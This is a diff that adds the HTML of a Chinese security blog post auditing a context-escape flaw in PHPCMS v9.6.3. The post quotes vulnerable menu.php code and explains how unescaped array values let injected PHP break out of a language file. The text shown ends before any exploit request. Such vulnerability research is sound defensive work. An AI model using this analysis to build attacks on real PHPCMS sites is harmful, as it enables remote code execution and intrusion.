@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>浅析 PHPCMSv9.6.3 上下文逃逸导致RCE - L1nq Blog</title><meta name="author" content="L1nq">
+<meta name="description" content="浅析 PHPCMSv9.6.3 转义失效导致RCE"><meta name="keywords" content='Code Audit, Context Escape'>
+  <meta itemprop="name" content="浅析 PHPCMSv9.6.3 上下文逃逸导致RCE">
+  <meta itemprop="description" content="浅析 PHPCMSv9.6.3 转义失效导致RCE">
+  <meta itemprop="datePublished" content="2025-08-02T21:30:04+00:00">
+  <meta itemprop="dateModified" content="2026-07-09T18:34:45+08:00">
+  <meta itemprop="wordCount" content="239">
+  <meta itemprop="image" content="https://sw1mblu3.fun/1.jpg">
+  <meta itemprop="keywords" content="Code Audit,Context Escape"><meta property="og:url" content="https://sw1mblu3.fun/posts/%E6%B5%85%E6%9E%90-phpcmsv9-6-3-%E4%B8%8A%E4%B8%8B%E6%96%87%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4rce/">
+  <meta property="og:site_name" content="L1nq Blog">
+  <meta property="og:title" content="浅析 PHPCMSv9.6.3 上下文逃逸导致RCE">
+  <meta property="og:description" content="浅析 PHPCMSv9.6.3 转义失效导致RCE">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-08-02T21:30:04+00:00">
+    <meta property="article:modified_time" content="2026-07-09T18:34:45+08:00">
+    <meta property="article:tag" content="Code Audit">
+    <meta property="article:tag" content="Context Escape">
+    <meta property="og:image" content="https://sw1mblu3.fun/1.jpg">
+<meta name="twitter:card" content="summary" /><meta name="twitter:site" content="@L1nq1_" />
+  <meta name="twitter:creator" content="@L1nq1_" /><meta name="twitter:image" content="https://sw1mblu3.fun/1.jpg" /><meta name="twitter:title" content="浅析 PHPCMSv9.6.3 上下文逃逸导致RCE" /><meta name="twitter:description" content="浅析 PHPCMSv9.6.3 转义失效导致RCE" /><meta name="application-name" content="L1nq Blog">
+<meta name="apple-mobile-web-app-title" content="L1nq Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://sw1mblu3.fun/posts/%E6%B5%85%E6%9E%90-phpcmsv9-6-3-%E4%B8%8A%E4%B8%8B%E6%96%87%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4rce/" title="浅析 PHPCMSv9.6.3 上下文逃逸导致RCE - L1nq Blog" /><link rel="prev" type="text/html" href="https://sw1mblu3.fun/posts/phpcms-v9-6-3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="PHPCMSv9.6.3 文件包含漏洞分析" /><link rel="next" type="text/html" href="https://sw1mblu3.fun/posts/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8-2025-web-writeup/" title="第十届 “磐石行动” 初赛 2025 Web Writeup" /><link rel="alternate" type="text/markdown" href="https://sw1mblu3.fun/posts/%E6%B5%85%E6%9E%90-phpcmsv9-6-3-%E4%B8%8A%E4%B8%8B%E6%96%87%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4rce/index.md" title="浅析 PHPCMSv9.6.3 上下文逃逸导致RCE - L1nq Blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "浅析 PHPCMSv9.6.3 上下文逃逸导致RCE",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/sw1mblu3.fun\/posts\/%E6%B5%85%E6%9E%90-phpcmsv9-6-3-%E4%B8%8A%E4%B8%8B%E6%96%87%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4rce\/"
+    },"image": ["https:\/\/sw1mblu3.fun\/1.jpg"],"genre": "posts","keywords": "Code Audit, Context Escape","wordcount":  239 ,
+    "url": "https:\/\/sw1mblu3.fun\/posts\/%E6%B5%85%E6%9E%90-phpcmsv9-6-3-%E4%B8%8A%E4%B8%8B%E6%96%87%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4rce\/","datePublished": "2025-08-02T21:30:04+00:00","dateModified": "2026-07-09T18:34:45+08:00","license": "2026","publisher": {
+      "@type": "Organization",
+      "name": "L1nq Blog","logo": "https:\/\/sw1mblu3.fun\/1.jpg"},"author": {
+        "@type": "Person",
+        "name": "L1nq"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script><meta name="view-transition" content="same-origin">
+<script>
+(function() {
+  
+  var hasNative = false;
+  try {
+    if (typeof CSS !== 'undefined' && CSS.supports) {
+      hasNative = CSS.supports('selector(::view-transition-old(root))');
+    }
+  } catch(e) {}
+  if (hasNative) return;
+
+  
+  document.addEventListener('click', function(e) {
+    var a = (e.target && e.target.closest) ? e.target.closest('a') : null;
+    if (!a || !a.href) return;
+    var url;
+    try { url = new URL(a.href, location.href); } catch(e) { return; }
+    if (url.origin !== location.origin) return;
+    if (a.target && a.target === '_blank') return;
+    if (a.hasAttribute && a.hasAttribute('download')) return;
+    if (e.metaKey || e.ctrlKey || e.altKey || e.shiftKey) return;
+
+    e.preventDefault();
+    try { sessionStorage.setItem('_vt', '1'); } catch(e) {}
+    document.documentElement.style.opacity = '0';
+    document.documentElement.style.transition = 'opacity 0.12s ease-out';
+    setTimeout(function() { location.href = a.href; }, 120);
+  }, { capture: true });
+
+  
+  try {
+    if (sessionStorage.getItem('_vt') === '1') {
+      sessionStorage.removeItem('_vt');
+      document.documentElement.style.opacity = '0';
+      document.documentElement.style.transition = 'none';
+      requestAnimationFrame(function() {
+        requestAnimationFrame(function() {
+          document.documentElement.style.transition = 'opacity 0.2s ease-in';
+          document.documentElement.style.opacity = '1';
+        });
+      });
+    }
+  } catch(e) {}
+})();
+</script>
+</head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto">
+    <div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>浅析 PHPCMSv9.6.3 上下文逃逸导致RCE</span>
+      </h1></div><div class="post-meta">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="meta-calendar-icon">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+        <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"/>
+        <path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/>
+        <path d="M7 14h.013"/><path d="M10.01 14h.005"/><path d="M13.01 14h.005"/><path d="M16.015 14h.005"/>
+        <path d="M13.015 17h.005"/><path d="M7.01 17h.005"/><path d="M10.01 17h.005"/>
+      </svg><time datetime="2025-08-02T21:30:04Z">2 Aug, 2025</time><span aria-hidden="true">|</span>
+        <a href="true" target="_blank" rel="noopener noreferrer">Edit this page</a></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#php-特性">PHP 特性</a></li>
+    <li><a href="#代码审计">代码审计</a></li>
+    <li><a href="#漏洞验证">漏洞验证</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>作为 PHPCMS 系列分析的最后一个漏洞，算是为这个系列画上句号。</p>
+<h1 class="heading-element" id="php-特性"><span>PHP 特性</span>
+  <a href="#php-%e7%89%b9%e6%80%a7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>首先了解一个 PHP 特性，当 PHP 读取数组键值对时，读取出来的键是会自动去除转义</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">//示例，读取数组中的键
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$L1nJ3[&#39;1&#39;] = &#39;1\&#39;&#39;;
+</span></span><span class="line"><span class="cl">print($L1nJ3[&#39;1&#39;]);</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>可以看到读取出来的值是不是 <code>\'</code> 而是 <code>'</code>
+<figure>
+  <img src="file-20250802213943871.png" alt="" loading="lazy"></figure>
+
+接下来进行代码审计</p>
+<h1 class="heading-element" id="代码审计"><span>代码审计</span>
+  <a href="#%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>代码定位在 phpcms/modules/admin/menu.php 81-101行</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">function edit() {  
+</span></span><span class="line"><span class="cl">    if(isset($_POST[&#39;dosubmit&#39;])) {  
+</span></span><span class="line"><span class="cl">       $id = intval($_POST[&#39;id&#39;]);  
+</span></span><span class="line"><span class="cl">       //print_r($_POST[&#39;info&#39;]);exit;  
+</span></span><span class="line"><span class="cl">       $r = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));  
+</span></span><span class="line"><span class="cl">       $this-&gt;db-&gt;update($_POST[&#39;info&#39;],array(&#39;id&#39;=&gt;$id));  
+</span></span><span class="line"><span class="cl">       //修改语言文件  
+</span></span><span class="line"><span class="cl">       $file = PC_PATH.&#39;languages&#39;.DIRECTORY_SEPARATOR.&#39;zh-cn&#39;.DIRECTORY_SEPARATOR.&#39;system_menu.lang.php&#39;;  
+</span></span><span class="line"><span class="cl">       require $file;  
+</span></span><span class="line"><span class="cl">       $key = $_POST[&#39;info&#39;][&#39;name&#39;];  
+</span></span><span class="line"><span class="cl">       if(!isset($LANG[$key])) {  
+</span></span><span class="line"><span class="cl">          $content = file_get_contents($file);  
+</span></span><span class="line"><span class="cl">          $content = substr($content,0,-2);  
+</span></span><span class="line"><span class="cl">          $data = $content.&#34;\$LANG[&#39;$key&#39;] = &#39;$_POST[language]&#39;;\r\n?&gt;&#34;;  
+</span></span><span class="line"><span class="cl">          file_put_contents($file,$data);  
+</span></span><span class="line"><span class="cl">       } elseif(isset($LANG[$key]) &amp;&amp; $LANG[$key]!=$_POST[&#39;language&#39;]) {  
+</span></span><span class="line"><span class="cl">          $content = file_get_contents($file);  
+</span></span><span class="line"><span class="cl">          $content = str_replace($LANG[$key],$_POST[&#39;language&#39;],$content);  
+</span></span><span class="line"><span class="cl">          file_put_contents($file,$content);  
+</span></span><span class="line"><span class="cl">       }  
+</span></span><span class="line"><span class="cl">       $this-&gt;update_menu_models($id, $r, $_POST[&#39;info&#39;]);  
+</span></span><span class="line"><span class="cl">         
+</span></span><span class="line"><span class="cl">       //结束语言文件修改  
+</span></span><span class="line"><span class="cl">       showmessage(L(&#39;operation_success&#39;));  
+</span></span><span class="line"><span class="cl">    } else {  
+</span></span><span class="line"><span class="cl">	    ...
+</span></span><span class="line"><span class="cl">    }  
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>指定文件路径并引用文件，这个路径定死了不可控</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> PC_PATH.<span class="s1">&#39;languages&#39;</span>.DIRECTORY_SEPARATOR.<span class="s1">&#39;zh-cn&#39;</span>.DIRECTORY_SEPARATOR.<span class="s1">&#39;system_menu.lang.php&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">//phpcms/languages/zh-cn/system_menu.lang.php
+</span></span><span class="line"><span class="cl">require <span class="nv">$file</span><span class="p">;</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>文件内的格式如下，全是 PHP 数组形式
+<figure>
+  <img src="file-20250802215820476.png" alt="" loading="lazy"></figure>
+
+当当我们第一次发包，<span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;数&quot; used in math mode [unicodeTextInMathMode] at position 6: LANG 数̲组中显然是没有传入的 " style="color:#ff4949">LANG 数组中显然是没有传入的 </span>key 的键，因此进入 if 内部。file_put_contents 第一个参数 <span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;仍&quot; used in math mode [unicodeTextInMathMode] at position 6: file 仍̲然是之前定死的，也就是往 ph…" style="color:#ff4949">file 仍然是之前定死的，也就是往 phpcms/languages/zh-cn/system_menu.lang.php 文件内写。第二个参数 </span>data 由 POST 传入的 <span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;、&quot; used in math mode [unicodeTextInMathMode] at position 4: key、̲" style="color:#ff4949">key、</span>language 参数和 system_menu.lang.php 文件中原本内容以及 ;\r\n?&gt; 字符串拼接而成</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;info&#39;</span><span class="o">][</span><span class="s1">&#39;name&#39;</span><span class="o">]</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span>!isset<span class="o">(</span><span class="nv">$LANG</span><span class="o">[</span><span class="nv">$key</span><span class="o">]))</span> <span class="o">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> file_get_contents<span class="o">(</span><span class="nv">$file</span><span class="o">)</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> substr<span class="o">(</span><span class="nv">$content</span>,0,-2<span class="o">)</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$content</span>.<span class="s2">&#34;\$LANG[&#39;</span><span class="nv">$key</span><span class="s2">&#39;] = &#39;</span><span class="nv">$_POST</span><span class="s2">[language]&#39;;\r\n?&gt;&#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    file_put_contents<span class="o">(</span><span class="nv">$file</span>,<span class="nv">$data</span><span class="o">)</span><span class="p">;</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>而在之前 PHPCMSV9 路由分析篇中提到过，其 $_POST 传入的值会先走过 param.class.php，然后才是 application.class.php::init() -&gt; call_user_func() 调用指定类文件
+而 param 类的构造方法中进行了转义，我们无法直接在 menu.php::exit()  if 内部绕掉转义</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">param</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="o">//</span><span class="n">路由配置</span>
+</span></span><span class="line"><span class="cl">	<span class="n">private</span> <span class="err">$</span><span class="n">route_config</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">public</span> <span class="n">function</span> <span class="n">__construct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="err">!</span><span class="n">get_magic_quotes_gpc</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="err">$</span><span class="n">_POST</span> <span class="o">=</span> <span class="n">new_addslashes</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="err">$</span><span class="n">_GET</span> <span class="o">=</span> <span class="n">new_addslashes</span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="err">$</span><span class="n">_REQUEST</span> <span class="o">=</span> <span class="n">new_addslashes</span><span class="p">(</span><span class="err">$</span><span class="n">_REQUEST</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="err">$</span><span class="n">_COOKIE</span> <span class="o">=</span> <span class="n">new_addslashes</span><span class="p">(</span><span class="err">$</span><span class="n">_COOKIE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>再看 elseif，假设我们在第一次发包后再发一次，那么此时 system_menu.lang.php 文件内已经写入了键值对，因此 isset(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>A</mi><mi>N</mi><mi>G</mi><mo stretchy="false">[</mo></mrow><annotation encoding="application/x-tex">LANG[</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal">A</span><span class="mord mathnormal">NG</span><span class="mopen">[</span></span></span></span>key]) 会返回 true，而 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>A</mi><mi>N</mi><mi>G</mi><mo stretchy="false">[</mo></mrow><annotation encoding="application/x-tex">LANG[</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal">A</span><span class="mord mathnormal">NG</span><span class="mopen">[</span></span></span></span>key] 上面在 PHP特性中分析过，取出来会自动进行去除转义操作，因此 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>A</mi><mi>N</mi><mi>G</mi><mo stretchy="false">[</mo></mrow><annotation encoding="application/x-tex">LANG[</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal">A</span><span class="mord mathnormal">NG</span><span class="mopen">[</span></span></span></span>key]!=$_POST[&rsquo;language&rsquo;] 也返回 true</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">elseif(isset($LANG[$key]) &amp;&amp; $LANG[$key]!=$_POST[&#39;language&#39;]) {
+</span></span><span class="line"><span class="cl">	$content = file_get_contents($file);
+</span></span><span class="line"><span class="cl">	$content = str_replace($LANG[$key],$_POST[&#39;language&#39;],$content);
+</span></span><span class="line"><span class="cl">	file_put_contents($file,$content);
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>达成条件，进入 elseif 函数体内，上下文逃逸的关键 str_replace，search为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>A</mi><mi>N</mi><mi>G</mi><mo stretchy="false">[</mo></mrow><annotation encoding="application/x-tex">LANG[</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal">A</span><span class="mord mathnormal">NG</span><span class="mopen">[</span></span></span></span>key] 而写入的是带有转义的
+假设第一次写入 <span class="katex-error" title="ParseError: KaTeX parse error: Expected group as argument to &#x27;\&#x27;&#x27; at position 15: LANG[&#x27;1&#x27;]=&#x27;1\&#x27;&#x27;̲，那么 " style="color:#ff4949">LANG[&#x27;1&#x27;]=&#x27;1\&#x27;&#x27;，那么 </span>LANG[<span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;此&quot; used in math mode [unicodeTextInMathMode] at position 6: key] 此̲时取出来为 1&#x27;，在上下文中找…" style="color:#ff4949">key] 此时取出来为 1&#x27;，在上下文中找并替换为 </span>_POST[&rsquo;language&rsquo;]，即：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">$LANG</span><span class="o">[</span><span class="s1">&#39;1&#39;</span><span class="o">]</span> -&gt; <span class="nv">$LANG</span><span class="o">[</span><span class="s1">&#39;1\&#39;</span><span class="o">]</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>那么此时语法上是不是就少了一个引号，这有点像序列化字符串逃逸，引号被整没了，那么后面的字符就可以逃逸出来</p>
